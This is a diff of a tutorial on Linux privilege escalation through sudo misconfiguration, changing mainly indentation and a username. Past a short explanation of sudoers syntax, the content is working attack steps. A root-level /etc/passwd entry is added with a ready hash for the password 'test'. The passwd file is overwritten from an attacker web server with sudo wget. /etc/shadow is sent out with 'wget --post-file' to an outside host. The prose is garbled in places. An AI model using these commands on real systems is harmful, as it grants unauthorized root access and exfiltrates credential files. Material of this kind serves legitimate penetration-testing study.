@@ -12,23 +12,25 @@ SUDOers
   
 Sudoer File Syntax.
 
-  root ALL=(ALL) ALL
+    root ALL=(ALL) ALL
 
 Explain 1: The root user can execute from ALL terminals, acting as ALL (any) users, and run ALL (any) command.
 
 The first part is the user, the second is the terminal from where the user can use the sudocommand, the third part is which users he may act as, and the last one is which commands he may run when using.sudo
 
-  user1 ALL= /sbin/poweroff
+    user1 ALL= /sbin/poweroff
   
 Explain 2: The above command, makes the user user1 can from any terminal, run the command power off using user1’s user password.
 
-  user1 ALL = (root) NOPASSWD: /usr/bin/find
+    user1 ALL = (root) NOPASSWD: /usr/bin/find
   
 Explain 3:  The above command, make the user touhid can from any terminal, run the command find as root user without password.
 
+
 Exploiting SUDO Users.
 To Exploiting sudo user u need to find which command u have to allow.
-sudo -l
+
+    sudo -l
 
 The above command shows which command have allowed to the current user.
 
@@ -71,12 +73,14 @@ Using awk Command
 Using nano Command
 nano is text editor using this editor u can modify passwd file and add a user in passwd file as root privilege after that u need to switch user. Add this line in /etc/passwd to order to add the user as root privilege.
 
-touhid:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash
+    user1:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash
 
 sudo nano  /etc/passwd
-now switch user password is : test
+now switch user password with password : test
 
-su touhid
+    su user1
+    
+
 Using wget Command
 this very cool way which requires a Web Server to download a file. This way i never saw on anywhere. lets explain this.
 
@@ -84,14 +88,17 @@ On Attaker Side.
 
 First Copy Target’s /etc/passwd file to attacker machine.
 modify file and add a user in passwd file which is saved in the previous step to the attacker machine.
-append this line only =>  touhid:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash
+append this line only => 
+
+    user1:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash
+
 host that passwd file to using any web server.
 On Victim Side.
 
 sudo wget http://192.168.56.1:8080/passwd -O /etc/passwd
 now switch user password is : test
 
-su touhid
+    su user1
 Note: if u want to dump file from a server like a root’s ssh key, Shadow file etc.
 
 sudo wget --post-file=/etc/shadow 192.168.56.1:8080
